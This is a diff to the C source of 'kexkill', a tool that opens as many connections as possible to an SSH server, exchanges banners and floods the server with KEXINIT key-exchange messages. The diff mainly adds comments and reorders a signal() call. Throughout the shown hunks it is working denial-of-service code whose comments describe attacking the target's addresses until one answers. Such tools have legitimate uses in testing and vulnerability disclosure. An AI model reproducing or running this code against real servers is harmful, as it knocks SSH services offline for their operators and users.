@@ -95,6 +95,9 @@ static char kexinit[] =
 
 static int verbose;
 
+/*
+ * Connect to a target.
+ */
 static int
 kk_connect(struct kk_conn *conn, struct sockaddr *sa, socklen_t salen)
 {
@@ -120,6 +123,9 @@ fail:
 	return (-1);
 }
 
+/*
+ * Close a connection.
+ */
 static void
 kk_close(struct kk_conn *conn)
 {
@@ -132,6 +138,9 @@ kk_close(struct kk_conn *conn)
 	conn->state = kk_closed;
 }
 
+/*
+ * Clean up a lost connection.
+ */
 static void
 kk_hup(struct kk_conn *conn)
 {
@@ -141,6 +150,9 @@ kk_hup(struct kk_conn *conn)
 	kk_close(conn);
 }
 
+/*
+ * Read data from the target into our connection buffer.
+ */
 static int
 kk_read(struct kk_conn *conn)
 {
@@ -160,6 +172,9 @@ kk_read(struct kk_conn *conn)
 	return (0);
 }
 
+/*
+ * Send data to the target.
+ */
 static int
 kk_write(struct kk_conn *conn, const void *data, size_t len)
 {
@@ -180,6 +195,9 @@ kk_write(struct kk_conn *conn, const void *data, size_t len)
 	return (0);
 }
 
+/*
+ * Process incoming data from target.
+ */
 static int
 kk_input(struct kk_conn *conn)
 {
@@ -207,14 +225,15 @@ kk_input(struct kk_conn *conn)
 			warnx("[%02x] invalid banner", conn->fd);
 			goto fail;
 		}
-		/* we're ready to send our own banner */
 		if (verbose)
 			warnx("[%02x] got banner: %s", conn->fd, conn->buf);
+		/* discard */
 		memmove(conn->buf, eop, eom - eop);
 		conn->buflen -= eop - conn->buf;
 		conn->state = kk_banner;
 		break;
 	case kk_kexinit:
+		/* extract packet length */
 		if (conn->buflen < 4)
 			break;
 		len =
@@ -226,6 +245,7 @@ kk_input(struct kk_conn *conn)
 			warnx("[%02x] oversize packet (%zu bytes)", conn->fd, len);
 			goto fail;
 		}
+		/* check if we have the whole packet */
 		eop = conn->buf + len + 4;
 		if (eop > eom)
 			break;
@@ -233,17 +253,19 @@ kk_input(struct kk_conn *conn)
 			warnx("[%02x] received type %u packet (%zu bytes)",
 			    conn->fd, (unsigned int)conn->buf[5], len);
 		if (conn->buf[5] == 1) {
+			/* SSH_MSG_DISCONNECT */
 			if (verbose)
 				warnx("[%02x] received disconnect", conn->fd);
 			kk_close(conn);
 			return (0);
 		} else if (conn->buf[5] == 20) {
+			/* SSH_MSG_KEXINIT */
 			if (verbose)
 				warnx("[%02x] received kexinit", conn->fd);
 		}
+		/* discard */
 		memmove(conn->buf, eop, eom - eop);
 		conn->buflen -= eop - conn->buf;
-		
 		break;
 	default:
 		;
@@ -254,6 +276,9 @@ fail:
 	return (-1);
 }
 
+/*
+ * Transmit data to target if we have any.
+ */
 static int
 kk_output(struct kk_conn *conn)
 {
@@ -283,6 +308,10 @@ fail:
 	return (-1);
 }
 
+/*
+ * Open as many connections as possible to a target, exchange banners, and
+ * send a stream of KEXINIT messages.
+ */
 static int
 kexkill(struct sockaddr *sa, socklen_t salen)
 {
@@ -310,7 +339,6 @@ kexkill(struct sockaddr *sa, socklen_t salen)
 			break;
 		if (verbose > 1)
 			warnx("polling %d/%d connections", n, k);
-		// usleep(1000000);
 		if ((ret = poll(pfd, maxconns, -1)) < 0 && errno != EINTR)
 			err(1, "poll()");
 		if (ret <= 0)
@@ -331,6 +359,9 @@ kexkill(struct sockaddr *sa, socklen_t salen)
 	return (k);
 }
 
+/*
+ * Print usage message and exit.
+ */
 static void
 usage(void)
 {
@@ -339,6 +370,9 @@ usage(void)
 	exit(1);
 }
 
+/*
+ * Main program.
+ */
 int
 main(int argc, char *argv[])
 {
@@ -346,8 +380,11 @@ main(int argc, char *argv[])
 	char *end, *host, *service;
 	int eai, opt;
 
+	/* initialization */
 	maxconns = DEFMAXCONNS;
+	signal(SIGPIPE, SIG_IGN);
 
+	/* process command-line options */
 	while ((opt = getopt(argc, argv, "n:v")) != -1)
 		switch (opt) {
 		case 'n':
@@ -368,28 +405,34 @@ main(int argc, char *argv[])
 	if (argc != 1)
 		usage();
 
+	/* check maxconns range */
 	if (maxconns < 1 || maxconns > MAXMAXCONNS)
 		errx(1, "connection limit must be between 1 and %d.",
 		    MAXMAXCONNS);
 
+	/* parse target spec */
 	host = argv[0];
 	if ((service = strchr(host, ':')) != NULL)
 		*service++ = '\0';
 	else
 		service = (char *)(uintptr_t)"ssh";
 
+	/* allocate connection buffers */
 	if ((conns = calloc(maxconns, sizeof *conns)) == NULL)
 		err(1, "calloc()");
 
-	signal(SIGPIPE, SIG_IGN);
-
+	/* look up target in DNS */
 	memset(&hints, 0, sizeof hints);
 	hints.ai_socktype = SOCK_STREAM;
 	if ((eai = getaddrinfo(host, service, &hints, &reslist)) != 0)
 		errx(1, "getaddrinfo(): %s", gai_strerror(eai));
+
+	/* attack each address we found until one answers */
 	for (res = reslist; res; res = res->ai_next)
 		if (kexkill(res->ai_addr, res->ai_addrlen) > 0)
 			break;
+
+	/* clean up */
 	freeaddrinfo(reslist);
 
 	exit(0);
